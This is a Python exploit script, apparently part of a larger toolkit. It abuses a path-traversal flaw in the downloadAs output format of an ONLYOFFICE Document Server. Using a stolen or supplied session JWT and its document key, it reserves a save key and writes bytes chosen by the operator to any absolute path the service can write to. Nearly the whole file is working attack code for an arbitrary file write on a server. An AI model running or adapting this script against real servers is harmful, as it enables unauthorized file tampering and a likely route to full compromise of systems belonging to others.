#!/usr/bin/env python3
"""Write operator-selected bytes through downloadAs output-format traversal."""

import argparse
from pathlib import Path

from onlyoffice_common import (
    DocumentServer,
    ExploitError,
    add_network_args,
    decode_jwt,
    entrypoint,
    network_options,
    read_local_file,
    read_token,
    remote_path,
    status,
)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    add_network_args(parser, timeout=60)
    parser.add_argument("--token-file", required=True, type=Path, help="document Session JWT file")
    parser.add_argument("--target-path", required=True, help="absolute destination writable by the service")
    data = parser.add_mutually_exclusive_group(required=True)
    data.add_argument("--data", help="UTF-8 text to write")
    data.add_argument("--data-file", type=Path, help="local file containing the exact bytes to write")
    args = parser.parse_args()
    options = network_options(args)
    path = remote_path(args.target_path, "--target-path")
    payload = read_local_file(args.data_file, "--data-file") if args.data_file else args.data.encode()
    if not payload:
        raise ExploitError("empty writes are unsupported by the vulnerable save branch")
    token = read_token(args.token_file)
    document = decode_jwt(token).get("document")
    if not isinstance(document, dict) or not isinstance(document.get("key"), str) or not document["key"]:
        raise ExploitError("Session JWT lacks a document key")
    key = document["key"]
    with DocumentServer(**options) as client:
        save_key = client.reserve_save(token, key)
        status(f"[+] reserved save key {save_key}")
        client.write_server_file(token, key, save_key, path, payload)
    status(f"[+] traversal request accepted for {path} ({len(payload)} bytes)")
    status("[*] file contents were not independently verified; this tool has no read primitive")
    return 0


if __name__ == "__main__":
    entrypoint(main)
